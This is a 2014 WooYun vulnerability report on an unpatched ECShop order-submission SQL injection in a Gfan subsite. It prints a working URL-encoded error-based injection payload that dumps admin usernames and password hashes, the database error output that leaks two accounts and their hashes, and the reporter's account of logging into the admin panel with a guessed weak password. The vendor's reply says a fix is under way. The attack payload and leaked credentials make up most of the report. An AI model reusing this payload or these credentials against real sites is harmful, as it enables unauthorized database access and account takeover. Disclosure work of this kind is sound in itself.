wybug_title: 机锋网某站未打补丁SQL注射
wybug_detail:
漏洞详情 披露状态：   									2014-07-04：	细节已通知厂商并且等待厂商处理中									2014-07-04：	厂商已经确认，细节仅向厂商公开									2014-07-14：	细节向核心白帽子及相关领域专家公开									2014-07-24：	细节向普通白帽子公开									2014-08-03：	细节向实习白帽子公开									2014-08-18：	细节向公众公开  简要描述：  详细说明：  没错就是他！！http://nb.gfan.com使用了ecshop模板 flow.php提交订单注入

(只能爆出一个用户这个就不爽了自己构造一下爆出两个)
goods_number%5B1%27+and+%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+concat%28user_name%2C0x7c%2Cpassword%29+FROM+ecs_admin_user+limit+1%2C1%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+1%3D1+%23%5D=1&submit=exp
   漏洞证明：  后台http://nb.gfan.com/admin/privilege.php?act=login<b>MySQL server error report:Array(    [0] => Array        (            [message] => MySQL Query Error        )    [1] => Array        (            [sql] => SELECT `goods_id`, `goods_attr_id`, `product_id`, `extension_code` FROM`gfanpark`.`ecs_cart` WHERE rec_id='1' and (select 1 from(select count(*),concat((select (select (SELECT concat(user_name,0x7c,password) FROM ecs_admin_user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1 #' AND session_id='4afc55a640659dd0d7ee1b6a87f5b755'        )    [2] => Array        (            [error] => Duplicate entry 'gfan2014|9f972b5b3cf89aa1af003accb4290a071' for key 'group_key'        )    [3] => Array        (            [errno] => 1062        ))<b>MySQL server error report:Array(    [0] => Array        (            [message] => MySQL Query Error        )    [1] => Array        (            [sql] => SELECT `goods_id`, `goods_attr_id`, `product_id`, `extension_code` FROM`gfanpark`.`ecs_cart` WHERE rec_id='1' and (select 1 from(select count(*),concat((select (select (SELECT concat(user_name,0x7c,password) FROM ecs_admin_user limit 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1 #' AND session_id='4422a128b5564f3a23604f2c8275a212'        )    [2] => Array        (            [error] => Duplicate entry 'bjgonghuo1|2a54e831158524187b7e585d34026b791' for key 'group_key'        )    [3] => Array        (            [errno] => 1062        ))第一个没解开 第二个也没解开！！！蛋疼我就试试弱口令发现用户名bjgonghuo1 bjgonghuo1进来了

   修复方案：     版权声明：转载请注明来源 mango@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-07-04 10:14 厂商回复： 感谢提交，修复中。。。 最新状态： 暂无
